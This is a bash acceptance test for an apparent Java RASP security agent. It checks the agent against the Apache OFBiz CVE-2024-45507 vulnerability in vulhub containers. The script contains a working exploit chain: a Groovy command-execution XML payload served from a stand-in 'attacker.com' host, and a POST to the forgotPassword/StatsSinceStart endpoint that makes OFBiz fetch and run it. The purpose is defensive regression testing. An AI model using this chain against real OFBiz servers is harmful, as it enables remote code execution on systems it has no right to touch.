#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_OFBIZ_45507_IMAGE:-vulhub/ofbiz:18.12.15}"
baseline_name="${OHMYRASP_VULHUB_OFBIZ_45507_BASELINE_NAME:-ohmyrasp-vulhub-ofbiz45507-baseline}"
protected_name="${OHMYRASP_VULHUB_OFBIZ_45507_PROTECTED_NAME:-ohmyrasp-vulhub-ofbiz45507-protected}"
baseline_port="${OHMYRASP_VULHUB_OFBIZ_45507_BASELINE_PORT:-18472}"
protected_port="${OHMYRASP_VULHUB_OFBIZ_45507_PROTECTED_PORT:-18473}"
attacker_port="${OHMYRASP_VULHUB_OFBIZ_45507_ATTACKER_PORT:-18504}"
attacker_host="${OHMYRASP_VULHUB_OFBIZ_45507_ATTACKER_HOST:-attacker.com}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-ofbiz-18.12.15-45507-java8-baseline"
protected_dir="logs/vulhub-ofbiz-18.12.15-45507-java8-protected"
payload_dir="${baseline_dir}/http"
protected_log="${protected_dir}/events.jsonl"
exploit_path="/webtools/control/forgotPassword/StatsSinceStart"
marker_file="/tmp/ohmyrasp-ofbiz45507-success"
http_pid=""

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$payload_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  if [[ -n "$http_pid" ]]; then
    kill "$http_pid" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

write_payload() {
  cat > "${payload_dir}/payload.xml" <<XML
<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">

    <screen name="StatsDecorator">
        <section>
            <actions>
                <set value="\${groovy:'touch ${marker_file}'.execute();}"/>
            </actions>
        </section>
    </screen>
</screens>
XML
}

start_http_server() {
  write_payload
  python3 -m http.server "$attacker_port" --bind 0.0.0.0 --directory "$payload_dir" \
    > "${baseline_dir}/http-server.log" 2>&1 &
  http_pid="$!"

  for attempt in $(seq 1 30); do
    if curl -fsS "http://127.0.0.1:${attacker_port}/payload.xml" >/dev/null 2>&1; then
      printf 'http_server_ready_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "${baseline_dir}/http-server.log" >&2 || true
  echo "temporary HTTP server did not expose OFBiz CVE-2024-45507 payload on ${attacker_port}" >&2
  exit 1
}

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl -k --max-time 30 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_ofbiz() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "https://127.0.0.1:${port}/accounting")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "OFBiz container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "OFBiz did not expose /accounting at ${port}" >&2
  exit 1
}

post_stats_decorator() {
  local port="$1"
  local output="$2"
  curl_status "$output" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "statsDecoratorLocation=http://${attacker_host}:${attacker_port}/payload.xml" \
    "https://127.0.0.1:${port}${exploit_path}"
}

wait_for_protected_startup() {
  for attempt in $(seq 1 180); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in OFBiz protected container" >&2
  exit 1
}

template_source_block_count() {
  grep -Ec '"algorithm":"java8_request_template_source".*"action":"block"' \
    "$protected_log" || true
}

wait_for_template_source_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(template_source_block_count)"
    if (( count > previous )); then
      printf 'template_source_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_request_template_source block event for OFBiz CVE-2024-45507" >&2
  exit 1
}

http_get_count() {
  grep -c 'GET /payload.xml' "${baseline_dir}/http-server.log" 2>/dev/null || true
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host="${attacker_host}:host-gateway" \
    -p "${baseline_port}:8443" \
    "$image" >/dev/null

  wait_for_ofbiz "$baseline_name" "$baseline_port" "$baseline_dir"
  docker exec "$baseline_name" rm -f "$marker_file"

  local status
  status="$(post_stats_decorator "$baseline_port" "${baseline_dir}/statsdecorator.response")"
  printf 'baseline_statsdecorator_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]]; then
    cat "${baseline_dir}/statsdecorator.response" >&2 || true
    echo "baseline OFBiz did not accept the remote decorator request" >&2
    exit 1
  fi
  if ! docker exec "$baseline_name" test -e "$marker_file"; then
    docker logs "$baseline_name" >&2 || true
    echo "baseline OFBiz did not execute the remote decorator Groovy command" >&2
    exit 1
  fi
  if (( $(http_get_count) < 2 )); then
    cat "${baseline_dir}/http-server.log" >&2 || true
    echo "baseline OFBiz did not fetch the remote decorator payload" >&2
    exit 1
  fi

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --name "$protected_name" \
    --add-host="${attacker_host}:host-gateway" \
    -p "${protected_port}:8443" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_ofbiz "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "OFBiz protected startup produced a detection before CVE-2024-45507 traffic" >&2
    exit 1
  fi
  docker exec "$protected_name" rm -f "$marker_file"

  local previous_count
  local previous_gets
  local status
  previous_count="$(template_source_block_count)"
  previous_gets="$(http_get_count)"
  status="$(post_stats_decorator "$protected_port" "${protected_dir}/statsdecorator.response")"
  printf 'protected_statsdecorator_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_template_source_block "$previous_count"
  if docker exec "$protected_name" test -e "$marker_file"; then
    docker exec "$protected_name" ls -l "$marker_file" >&2 || true
    echo "protected OFBiz still executed the remote decorator Groovy command" >&2
    exit 1
  fi
  if (( $(http_get_count) != previous_gets )); then
    cat "${baseline_dir}/http-server.log" >&2 || true
    echo "protected OFBiz fetched the remote decorator payload after request block" >&2
    exit 1
  fi
  if ! grep -Fq "OhMyRASP Java 8 blocked suspicious request path" \
    "${protected_dir}/statsdecorator.response"; then
    cat "${protected_dir}/statsdecorator.response" >&2 || true
    echo "protected OFBiz response did not include the Java 8 request block exception" >&2
    exit 1
  fi
}

start_http_server
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub OFBiz 18.12.15 CVE-2024-45507 Java8 acceptance passed"
